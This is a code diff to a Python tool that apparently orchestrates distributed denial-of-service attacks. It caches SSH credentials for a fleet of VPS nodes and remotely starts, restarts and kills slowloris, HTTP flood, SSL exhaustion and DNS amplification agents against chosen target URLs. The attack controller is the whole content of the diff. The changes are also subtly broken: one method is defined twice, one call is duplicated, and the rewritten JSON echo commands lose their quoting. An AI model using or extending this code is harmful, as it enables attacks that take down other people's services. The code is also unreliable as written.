@@ -226,7 +226,21 @@ class SecurityManager:
             return ""
         
         # Remove dangerous characters
-        sanitized = re.sub(r'[;\'&quot;\\\]', '', str(input_str))
+        # Remove dangerous characters and command injection patterns
+        sanitized = str(input_str)
+        
+        # Remove shell metacharacters
+        sanitized = re.sub(r'[;\'"\`$|&<>(){}\[\]\n\r]', '', sanitized)
+        
+        # Remove command substitution patterns
+        sanitized = re.sub(r'\$\(.*?\)', '', sanitized)
+        sanitized = re.sub(r'`.*?`', '', sanitized)
+        
+        # Remove path traversal attempts
+        sanitized = re.sub(r'\.\./+', '', sanitized)
+        
+        # Remove null bytes
+        sanitized = sanitized.replace('\x00', '')
         
         # Limit length if specified
         if max_length and len(sanitized) > max_length:
@@ -241,6 +255,7 @@ class DatabaseManager:
         """Initialize database manager with specified database file"""
         self.db_file = db_file
         self.init_database()
+        self.validate_schema()
     
     def init_database(self):
         """Initialize database schema with all required tables"""
@@ -332,6 +347,51 @@ class DatabaseManager:
                 conn.close()
             self.migrate_database()
     
+
+    def validate_schema(self):
+        """Validate and update database schema"""
+        try:
+            conn = sqlite3.connect(self.db_file)
+            cursor = conn.cursor()
+            
+            # Check required tables exist
+            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
+            tables = [row[0] for row in cursor.fetchall()]
+            
+            required_tables = ['vps_nodes', 'attack_sessions', 'attack_results']
+            missing_tables = [t for t in required_tables if t not in tables]
+            
+            if missing_tables:
+                logger.warning(f"Missing tables: {missing_tables}, reinitializing database")
+                conn.close()
+                self.init_database()
+                return
+            
+            # Check required columns in attack_results
+            cursor.execute("PRAGMA table_info(attack_results)")
+            columns = [row[1] for row in cursor.fetchall()]
+            
+            required_columns = ['id', 'session_id', 'vps_ip', 'connections_active', 
+                              'packets_sent', 'bytes_sent', 'error_count', 'cpu_usage',
+                              'memory_usage', 'response_codes', 'status', 'timestamp']
+            
+            missing_columns = [c for c in required_columns if c not in columns]
+            
+            # Add missing columns
+            for col in missing_columns:
+                if col == 'bytes_sent':
+                    cursor.execute("ALTER TABLE attack_results ADD COLUMN bytes_sent INTEGER DEFAULT 0")
+                elif col == 'response_codes':
+                    cursor.execute("ALTER TABLE attack_results ADD COLUMN response_codes TEXT")
+                logger.info(f"Added missing column: {col}")
+            
+            conn.commit()
+            conn.close()
+            logger.info("Database schema validation completed")
+            
+        except Exception as e:
+            logger.error(f"Schema validation error: {str(e)}")
+
     def add_vps(self, ip_address, username, encrypted_password, ssh_port=22, location=None, tags=None):
         """Add a new VPS node to the database"""
         conn = None
@@ -772,6 +832,25 @@ class DatabaseManager:
         # This method is included for consistency with other managers
         pass
 
+
+def with_error_handling(func):
+    """Decorator to add comprehensive error handling to SSH operations"""
+    def wrapper(*args, **kwargs):
+        try:
+            return func(*args, **kwargs)
+        except paramiko.SSHException as e:
+            logger.error(f"SSH error in {func.__name__}: {str(e)}")
+            return False, f"SSH error: {str(e)}"
+        except socket.timeout as e:
+            logger.error(f"Timeout in {func.__name__}: {str(e)}")
+            return False, f"Timeout: {str(e)}"
+        except Exception as e:
+            logger.error(f"Unexpected error in {func.__name__}: {str(e)}")
+            logger.debug(f"Traceback: {traceback.format_exc()}")
+            return False, f"Error: {str(e)}"
+    return wrapper
+
+
 class SSHManager:
     """Manages SSH connections to VPS nodes"""
     
@@ -780,6 +859,7 @@ class SSHManager:
         self.connections = {}
         self.security_manager = security_manager
         self.connection_cache = {}  # Cache VPS credentials for auto-reconnect
+        self.cache_lock = threading.Lock()  # Thread-safe cache access
     
     def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
         """Connect to a VPS with comprehensive error handling"""
@@ -790,10 +870,17 @@ class SSHManager:
             password = self.security_manager.decrypt_password(encrypted_password)
             
             # Cache credentials for auto-reconnect
-            self.connection_cache[ip] = {
-                'username': username,
-                'encrypted_password': encrypted_password,
-                'port': port
+            with self.cache_lock:
+                self.connection_cache[ip] = {
+                    'username': username,
+                    'encrypted_password': encrypted_password,
+                    'port': port,
+                    'target': '',
+                    'http_port': 80,
+                    'attack_type': 'slowloris',
+                    'connections': 100,
+                    'duration': 300,
+                    'delay': 10
             }
             
             ssh = paramiko.SSHClient()
@@ -846,6 +933,7 @@ class SSHManager:
                 logger.error(f"Error disconnecting from {ip}: {str(e)}")
         return False
     
+    @with_error_handling
     def execute_command(self, ip, command, timeout=60, auto_reconnect=True, max_retries=3):
         """Execute command with enhanced error handling and recovery"""
         
@@ -944,24 +1032,43 @@ class SSHManager:
         """Restart attack process on VPS"""
         try:
             # Kill existing attack process
-            kill_cmd = "pkill -f 'python3 agent.py'"
+            kill_cmd = f"pkill -f 'agent.py' && pkill -f '{ip}'"
             success, output = self.execute_command(ip, kill_cmd, auto_reconnect=False)
             
             # Start new attack process
-            if ip in self.connection_cache:
-                cached = self.connection_cache[ip]
-                attack_cmd = f"cd ~/slowhttp_agent && nohup python3 agent.py --target {cached.get('target', '')} --port {cached.get('port', 80)} > /dev/null 2>&1 &"
-                success, output = self.execute_command(ip, attack_cmd, auto_reconnect=False)
-                
-                if success:
-                    logger.info(f"Successfully restarted attack on {ip}")
-                    return True
+            with self.cache_lock:
+                if ip in self.connection_cache:
+                    cached = self.connection_cache[ip]
+                    
+                    # Validate cache has required attack parameters
+                    if not cached.get('target'):
+                        logger.error(f"No target in cache for {ip}, cannot restart attack")
+                        return False
+                    
+                    if not cached.get('attack_type'):
+                        logger.warning(f"No attack_type in cache for {ip}, using default 'slowloris'")
+                        cached['attack_type'] = 'slowloris'
+                    
+                    # Retrieve attack parameters from cache
+                    target = cached.get('target', '')
+                    port = cached.get('http_port', 80)
+                    attack_type = cached.get('attack_type', 'slowloris')
+                    connections = cached.get('connections', 100)
+                    duration = cached.get('duration', 300)
+                    delay = cached.get('delay', 10)
+                    
+                    attack_cmd = f"cd ~/slowhttp_agent && nohup python3 agent.py --target '{target}' --port {port} --attack-type {attack_type} --connections {connections} --duration {duration} --delay {delay} > /dev/null 2>&1 &"
+                    success, output = self.execute_command(ip, attack_cmd, auto_reconnect=False)
+                    
+                    if success:
+                        logger.info(f"Successfully restarted attack on {ip}")
+                        return True
+                    else:
+                        logger.error(f"Failed to restart attack on {ip}: {output}")
+                        return False
                 else:
-                    logger.error(f"Failed to restart attack on {ip}: {output}")
+                    logger.error(f"No cached data for {ip}")
                     return False
-            else:
-                logger.error(f"No cached data for {ip}")
-                return False
                 
         except Exception as e:
             logger.error(f"Failed to restart attack on {ip}: {str(e)}")
@@ -1054,17 +1161,17 @@ class SSHManager:
             # Create a command to gather system information
             cmd = """
             echo "{"
-            echo "  \&quot;hostname\&quot;: \&quot;$(hostname)\&quot;,"
-            echo "  \&quot;os\&quot;: \&quot;$(cat /etc/os-release | grep PRETTY_NAME | cut -d '=' -f 2 | tr -d '\&quot;')\&quot;,"
-            echo "  \&quot;kernel\&quot;: \&quot;$(uname -r)\&quot;,"
-            echo "  \&quot;cpu\&quot;: \&quot;$(grep 'model name' /proc/cpuinfo | head -1 | cut -d ':' -f 2 | xargs)\&quot;,"
-            echo "  \&quot;cpu_cores\&quot;: $(grep -c processor /proc/cpuinfo),"
-            echo "  \&quot;memory_total\&quot;: \&quot;$(free -h | grep Mem | awk '{print $2}')\&quot;,"
-            echo "  \&quot;memory_used\&quot;: \&quot;$(free -h | grep Mem | awk '{print $3}')\&quot;,"
-            echo "  \&quot;disk_total\&quot;: \&quot;$(df -h / | tail -1 | awk '{print $2}')\&quot;,"
-            echo "  \&quot;disk_used\&quot;: \&quot;$(df -h / | tail -1 | awk '{print $3}')\&quot;,"
-            echo "  \&quot;python_version\&quot;: \&quot;$(python3 --version 2>&1)\&quot;,"
-            echo "  \&quot;uptime\&quot;: \&quot;$(uptime -p)\&quot;"
+            echo "  "hostname": "$(hostname)","
+            echo "  "os": "$(cat /etc/os-release | grep PRETTY_NAME | cut -d '=' -f 2 | tr -d '"')","
+            echo "  "kernel": "$(uname -r)","
+            echo "  "cpu": "$(grep 'model name' /proc/cpuinfo | head -1 | cut -d ':' -f 2 | xargs)","
+            echo "  "cpu_cores": $(grep -c processor /proc/cpuinfo),"
+            echo "  "memory_total": "$(free -h | grep Mem | awk '{print $2}')","
+            echo "  "memory_used": "$(free -h | grep Mem | awk '{print $3}')","
+            echo "  "disk_total": "$(df -h / | tail -1 | awk '{print $2}')","
+            echo "  "disk_used": "$(df -h / | tail -1 | awk '{print $3}')","
+            echo "  "python_version": "$(python3 --version 2>&1)","
+            echo "  "uptime": "$(uptime -p)""
             echo "}"
             """
             
@@ -3775,7 +3882,13 @@ class AttackManager:
             # Build attack command
             cmd = self._build_attack_command(target_url, attack_type, parameters)
             
+            # Update cache with attack parameters for restart capability
+            self._update_attack_cache(vps_ip, target_url, attack_type, parameters)
+            
             # Execute with longer timeout and better error detection
+            # Update cache with attack parameters for restart capability
+            self._update_attack_cache(vps_ip, target_url, attack_type, parameters)
+            
             success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
             
             if success:
@@ -3809,14 +3922,51 @@ class AttackManager:
             print(f"\n{Colors.RED}[ERROR] Failed to launch attack on any VPS nodes{Colors.RESET}")
             return False
     
+    def _update_attack_cache(self, vps_ip, target_url, attack_type, parameters):
+        """Update connection cache with attack parameters for restart capability"""
+        if vps_ip in self.connection_cache:
+            self.connection_cache[vps_ip].update({
+                'target': target_url,
+                'http_port': parameters.get('port', 80),
+                'attack_type': attack_type,
+                'connections': parameters.get('connections', 100),
+                'duration': parameters.get('duration', 300),
+                'delay': parameters.get('delay', 10)
+            })
+    
+    def _update_attack_cache(self, vps_ip, target_url, attack_type, parameters):
+        """Update connection cache with attack parameters for restart capability"""
+        if vps_ip in self.ssh_manager.connection_cache:
+            self.ssh_manager.connection_cache[vps_ip].update({
+                'target': target_url,
+                'http_port': parameters.get('port', 80),
+                'attack_type': attack_type,
+                'connections': parameters.get('connections', 100),
+                'duration': parameters.get('duration', 300),
+                'delay': parameters.get('delay', 10)
+            })
+
     def _build_attack_command(self, target_url, attack_type, parameters):
         """Build the attack command to execute on VPS"""
+
+        # Validate required parameters
+        if not target_url or not target_url.strip():
+            raise ValueError("target_url cannot be empty")
+        
+        if attack_type not in ['slowloris', 'slow_post', 'slow_read', 'http_flood', 'ssl_exhaust', 'dns_amplification']:
+            raise ValueError(f"Invalid attack_type: {attack_type}")
+        
+        # Sanitize target_url
+        target_url = target_url.strip()
+        if not target_url.startswith(('http://', 'https://')):
+            target_url = 'http://' + target_url
+
         
         # Base command with nohup to keep running after SSH disconnects
         cmd = "cd ~/slowhttp_agent && nohup python3 agent.py "
         
         # Add target
-        cmd += f"--target &quot;{target_url}&quot; "
+        cmd += f"--target \"{target_url}\" "
         
         # Add attack type
         cmd += f"--attack-type {attack_type} "
@@ -3843,7 +3993,7 @@ class AttackManager:
                 cmd += f"--target-ip {target_ip} "
         
         # Redirect output to log file and run in background
-        cmd += f"> attack_{attack_type}_{int(time.time())}.log 2>&1 & echo $!"
+        cmd += f"> attack_{attack_type}_{int(time.time())}.log 2>&1 & echo $! > /tmp/slowhttp_agent_$$.pid"
         
         return cmd
     
@@ -3897,7 +4047,7 @@ class AttackManager:
                     continue
                 
                 # Get CPU and memory usage
-                cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep | awk '{print $3 &quot; &quot; $4}'"
+                cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep | awk '{print $3 \" \" $4}'"
                 success, resource_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                 
                 cpu_usage = None
@@ -4023,8 +4173,8 @@ class AttackManager:
         for vps_ip in attack_info['vps_list']:
             print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
             
-            # Kill all agent.py processes
-            cmd = "pkill -f 'python3 agent.py'"
+            # Kill all agent.py processes for this VPS
+            cmd = f"pkill -9 -f 'python3.*agent.py' || true"
             success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
             
             if success:
